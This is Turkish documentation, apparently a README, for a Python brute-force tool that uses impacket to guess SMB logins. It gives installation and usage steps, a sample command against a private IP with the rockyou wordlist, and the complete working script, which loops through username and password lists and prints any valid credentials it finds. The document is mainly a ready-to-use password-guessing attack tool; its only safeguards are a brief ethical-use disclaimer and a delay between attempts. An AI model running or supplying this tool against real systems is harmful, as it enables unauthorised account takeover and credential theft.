# SMB Brute Force Tool
### SMB Brute Force Script Dokümantasyonu

Bu dokümantasyon, `impacket` kütüphanesini kullanarak yazılmış olan SMB Brute Force Script'inin nasıl kullanılacağına dair detayları sağlar. Bu script, belirli bir hedef üzerinde sağlanan kullanıcı adı ve parola listelerindeki kombinasyonları deneyerek SMB giriş bilgilerini brute force yöntemiyle denemektedir.

#### Gereksinimler

Python'un yüklü olduğundan emin olun. Ayrıca `impacket` kütüphanesine de ihtiyacınız olacak, bunu `pip` kullanarak yükleyebilirsiniz:

```bash
pip install impacket
```

#### Script Açıklaması

Script şu işlevleri yerine getirir:

1. **smb_login_test**: Belirtilen kullanıcı adı ve parola ile hedef IP'deki SMB servisine giriş yapmayı dener.
2. **load_list_from_file**: Bir dosyadan kullanıcı adı veya parola listesini yükler, her bir girişin başındaki ve sonundaki boşlukları temizler.
3. **brute_force_smb**: Kullanıcı adı ve parola kombinasyonları üzerinden iterasyon yapar, her kombinasyon için `smb_login_test` fonksiyonunu çağırır.

#### Kullanım

Script'i `smb_bruteforce.py` adıyla bir dosyaya kaydedin ve gerekli argümanlarla birlikte terminalden çalıştırın.

##### Komut Satırı Argümanları

- `target_ip`: Hedef SMB sunucusunun IP adresi.
- `-l` veya `--userlist`: Kullanıcı adı listesini içeren dosyanın yolu.
- `-p` veya `--passlist`: Parola listesini içeren dosyanın yolu.

##### Örnek Komut

```bash
python smb_bruteforce.py 192.168.1.10 -l common_user.txt -p rockyou.txt
```

Bu örnekte:
- `192.168.1.10` hedef SMB sunucusunun IP adresidir.
- `-l common_user.txt` kullanıcı adı listesinin dosya yolunu belirtir.
- `-p rockyou.txt` parola listesinin dosya yolunu belirtir.

#### Script Açıklaması

```python
import argparse
from impacket.smbconnection import SMBConnection
import time

def smb_login_test(target_ip, username, password, domain='', timeout=10):
    try:
        smb_connection = SMBConnection(target_ip, target_ip)
        smb_connection.login(username, password, domain)
        print(f"[+] Login successful on {target_ip} with username '{username}' and password '{password}'")
        smb_connection.logoff()
        return True
    except Exception as e:
        print(f"[-] Login failed on {target_ip} with username '{username}' and password '{password}'")
        return False

def load_list_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='ISO-8859-1') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return []

def brute_force_smb(target_ip, username_list, password_list, domain=''):
    for username in username_list:
        for password in password_list:
            if smb_login_test(target_ip, username, password, domain):
                print(f"[!] Valid credentials found: {username} / {password}")
                return True
            time.sleep(1)  # Sleep to avoid rapid requests that may lock accounts
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SMB Brute Force Script")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("-l", "--userlist", required=True, help="Path to the username list file")
    parser.add_argument("-p", "--passlist", required=True, help="Path to the password list file")

    args = parser.parse_args()

    target_ip = args.target_ip
    username_file = args.userlist
    password_file = args.passlist

    username_list = load_list_from_file(username_file)
    password_list = load_list_from_file(password_file)

    if username_list and password_list:
        brute_force_smb(target_ip, username_list, password_list)
    else:
        print("Username list or password list is empty.")
```

### Detaylı Adımlar

1. **Gerekli Kütüphanelerin İçe Aktarılması**:
   Script, gerekli kütüphaneleri içe aktarır: `argparse` komut satırı argümanlarını işlemek için, `impacket` kütüphanesinden `SMBConnection` SMB bağlantıları için ve `time` login denemeleri arasında bekleme süresi eklemek için kullanılır.

2. **smb_login_test Fonksiyonunun Tanımlanması**:
   Bu fonksiyon, sağlanan kullanıcı adı ve parola ile SMB bağlantısı kurmaya çalışır. Başarılı olursa, başarılı olduğunu belirtir ve bağlantıyı kapatır. Başarısız olursa, hatayı belirtir.

3. **load_list_from_file Fonksiyonunun Tanımlanması**:
   Bu fonksiyon, belirtilen dosyayı okuyarak bir liste döner. Her satırı okur ve başındaki ve sonundaki boşlukları temizler. `ISO-8859-1` kodlamasını kullanarak özel karakterleri de düzgün okur.

4. **brute_force_smb Fonksiyonunun Tanımlanması**:
   Bu fonksiyon, kullanıcı adı ve parola listeleri üzerinden iterasyon yapar ve her kombinasyon için `smb_login_test` fonksiyonunu çağırır. Başarılı giriş bulunursa, geçerli kimlik bilgilerini yazdırır.

5. **Ana Çalışma Bloğu**:
   Script, komut satırı argümanlarını parse eder ve hedef IP, kullanıcı adı listesi dosyası ve parola listesi dosyası için argümanları alır. Bu listeleri yükler ve `brute_force_smb` fonksiyonunu çağırarak brute force saldırısını başlatır.

### Notlar

- **Etik Kullanım**: Bu script yalnızca etik hacking ve hedef sistemin sahibinin izni ile kullanılmalıdır.
- **Yasal Sonuçlar**: Bu script'in yetkisiz kullanımı yasa dışı olabilir ve cezai yaptırımlara tabi olabilir. Her zaman herhangi bir penetration testi aracını çalıştırmadan önce açık izin alın.

Bu dokümantasyon, SMB Brute Force Script'inin nasıl kullanılacağını ve anlaşılacağını sağlayan kapsamlı bir rehber sunar. Sorularınız varsa veya daha fazla yardıma ihtiyaç duyarsanız, lütfen bana bildirin.
